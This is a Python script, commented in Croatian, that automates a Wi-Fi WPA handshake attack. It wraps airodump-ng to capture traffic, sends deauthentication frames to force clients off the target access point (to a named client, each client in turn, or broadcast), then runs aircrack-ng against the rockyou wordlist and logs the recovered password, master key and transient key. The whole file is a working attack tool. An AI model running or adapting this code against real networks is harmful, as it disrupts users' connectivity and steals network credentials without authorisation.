import subprocess
import time
import os
import sys
import re
import glob
sys.path.append(os.path.join(os.path.dirname(__file__), "tests"))
from tests import auto_deauth, setup
from logger import logger


CAPTURE_FILE = "capture"
DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"


# Pomocna funkcija koja snima mrezni promet za hvatanje handshake-a
def start_airodump(interface, bssid, channel):
    # Postavlja rucno kanal na kojem ce slusati
    subprocess.run(["iwconfig", interface, "channel", channel], check=True)

    # Obavijestava korisnika da je snimanje prometa pocelo
    print(f"Starting airodump-ng on BSSID {bssid} (Channel {channel})...")
    logger.info(f"Starting airodump-ng on BSSID {bssid} (Channel {channel})...")
    # Kreira novi podproces
    airodump = subprocess.Popen(["airodump-ng", "--bssid", bssid, "--channel", channel, "-w", CAPTURE_FILE, interface], 
                                stdout=subprocess.DEVNULL, 
                                stderr=subprocess.DEVNULL
                                )

    time.sleep(1)

    return airodump


# Funkcija provjerava je li handshake uhvacen u pcap datoteci
def handshake_exists(cap_file, bssid):
    try:
        result = subprocess.run(["aircrack-ng", cap_file], capture_output=True, text=True)

        # Provjeri postoji li linija s BSSID-om i "handshake"
        for line in result.stdout.splitlines():
            if bssid.lower() in line.lower() and "handshake" in line.lower():

                return True

        return False

    except Exception as e:
        print(f"Error while checking for handshake: {e}")
        logger.warning(f"Error while checking for handshake: {e}")

        return False


# Funkcija ceka na handshake
def wait_for_handshake(cap_file, bssid, timeout=30):
    for _ in range(timeout):
        time.sleep(1)

        if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0:
            if handshake_exists(cap_file, bssid):

                return True

    return False


# Funkcija dohvaca informacije iz standardnog izlaza
def log_aircrack_output(output):
    # Cisti ANSI znakove
    clean_output = re.sub(r'\x1b\[.*?[@-~]', '', output)
    # Dohvaca pronadenu
    password_match = re.search(r"KEY FOUND!\s\[\s(.+?)\s\]", clean_output)

    if password_match:
        password = password_match.group(1)
        logger.info(f"Found password: {password}")

    # Dohvaca Master Key
    master_key_match = re.search(r"Master Key\s*:\s*((?:[0-9A-F]{2}(?:\s+|$))+)\s*((?:[0-9A-F]{2}(?:\s+|$))+)", clean_output, re.IGNORECASE)
    
    if master_key_match:
        mk1 = master_key_match.group(1).strip()
        mk2 = master_key_match.group(2).strip()
        logger.info(f"Found master key: {mk1}{mk2}")

    # Dohvaca Transient Key
    transient_key_match = re.search(r"Transient Key\s*:\s*((?:[0-9A-F]{2}(?:\s+|$)){16})\s*((?:[0-9A-F]{2}(?:\s+|$)){16})\s*((?:[0-9A-F]{2}(?:\s+|$)){16})\s*((?:[0-9A-F]{2}(?:\s+|$)){16})",
                                    clean_output, 
                                    re.IGNORECASE
                                    )

    if transient_key_match:
        transient_key_parts = [transient_key_match.group(i).strip() for i in range(1, 5)]
        transient_key = " ".join(transient_key_parts)
        logger.info(f"Found transient key: {transient_key}")

    # Dohvaca EAPOL HMAC
    eapol_match = re.search(r"EAPOL HMAC\s*:\s*(.+)", clean_output)

    if eapol_match:
        logger.info(f"Found EAPOL HMAC: {eapol_match.group(1).strip()}")


# Funkcija pokusava 'razbiti' lozinku pomocu rijecnika
def run_aircrack(cap_file, wordlist, bssid):
    # Obavijestava korisnika
    print(f"Starting aircrack-ng with wordlist: {wordlist}")
    logger.info(f"Starting aircrack-ng with wordlist: {wordlist}")
    # Dohvaca pocetno vrijeme 'razbijanja' lozinke
    start_time = time.time()

    try:
        result = subprocess.run(["aircrack-ng", "-w", wordlist, "-b", bssid, cap_file], capture_output=True, text=True, check=True)

        # Dohvaca vrijeme trajanja
        duration = time.time() - start_time
        logger.info(f"Aircrack-ng finished in {duration:.2f} seconds")
        # Ispis korisniku u terminal
        print(result.stdout)
        # Dohvaca ostale informacije iz ispisa naredbe
        log_aircrack_output(result.stdout)

    except subprocess.CalledProcessError:
        print("Aircrack-ng failed or was interrupted.")
        logger.warning("Aircrack-ng failed or was interrupted.")


def main():
    # Dohvaca sve potrebne varijable 
    interface, bssid, channel, target, timeout = auto_deauth.main(called_by="crack")

    # Zapocinje snimanje prometa na datom AP-u
    airodump = start_airodump(interface, bssid, channel)

    cap_file = None
    # Ceka dok se ne kreira capture datoteka
    for _ in range(10):
        cap_files = glob.glob("capture-*.cap")
        if cap_files:
            cap_file = max(cap_files, key=os.path.getmtime)
            break

        time.sleep(1)
    # Ako nema capture datoteka, obavijesti korisnika
    if not cap_file:
        print("No capture file found.")
        logger.error("No capture file found.")
        sys.exit(1)

    # Kontrolna varijabla za 4 way handshake
    handshake = False

    # Ako je korisnik specificirao zrtvu, koristi nju
    if target:
        print(f"Target MAC provided: {target}")
        logger.info(f"Target MAC provided: {target}")

        auto_deauth.start_deauth(interface, bssid, channel, target, timeout)
        # Ceka maksimalno 30sec za handshake
        handshake = wait_for_handshake(cap_file, bssid, timeout=30)

        if handshake:
            print("Handshake captured!")
            logger.info("Handshake captured!")

    # Ako zrtva nije specificirana
    else:
        print("No specific target provided.")
        logger.info("No specific target provided.")
        # Dohvaca listu svih stanica s AP-a
        clients = auto_deauth.get_clients_by_bssid().get(bssid)

        if not clients:
            # Ako nije nadena niti jedna stanica izvodi broadcast deauth
            print("No active clients found. Trying broadcast deauth...")
            logger.info("No active clients found. Trying broadcast deauth...")

            auto_deauth.start_deauth(interface, bssid, channel, target=None, timeout=timeout)
            # Ceka maksimalno 30sec za handshake
            handshake = wait_for_handshake(cap_file, bssid, timeout=30)

            if handshake:
                print("Handshake captured!")
                logger.info("Handshake captured!")

        else:
            # Nasao je vise od 0 klijenata
            print(f"Found {len(clients)} clients.")
            logger.info(f"Found {len(clients)} clients.")
            # Prolazi kroz listu stanica
            for i, client_mac in enumerate(clients, start=1):
                print(f"[{i}/{len(clients)}] Deauthing {client_mac}...")
                logger.info(f"[{i}/{len(clients)}] Deauthing {client_mac}...")
                # Deautenticira klijenta mreze
                auto_deauth.start_deauth(interface, bssid, channel, target=client_mac, timeout=timeout)
                handshake = wait_for_handshake(cap_file, bssid, timeout=30)

                if handshake:
                    # Ako je handshake uhvacen zavrsi i obavijesti korisnika
                    print("Handshake captured!")
                    logger.info("Handshake captured!")
                    break

    # Zaustavlja snimanje mreznog prometa
    airodump.terminate()
    airodump.wait()
    print("Airodump-ng stopped.")
    logger.info("Airodump-ng stopped.")

    # U slucaju da niti jedan handshake nije uhvacen, obavijestava korisnika i izlazi
    if not handshake:
        print("No handshake captured.")
        logger.info("No handshake captured.")
        # Gasi se monitor mod
        setup.disable_monitor_mode(interface)

        return

    # Ako je handshake uhvacen, pita korisnika za rijecnik
    while True:
        wordlist = input("Enter path to wordlist or press Enter for default wordlist: ").strip()

        if not wordlist:
            wordlist = DEFAULT_WORDLIST
            break

        elif os.path.isfile(wordlist):
            break

        else:
            print("Invalid path or file does not exist. Starting with default wordlist...")
            logger.warning("Invalid path or file does not exist. Starting with default wordlist...")
            wordlist = DEFAULT_WORDLIST
            break

    # Pokusava dobiti lozinku
    run_aircrack(cap_file, wordlist, bssid)

    # Gasi monitor mod
    setup.disable_monitor_mode(interface)


if __name__ == "__main__":
    main()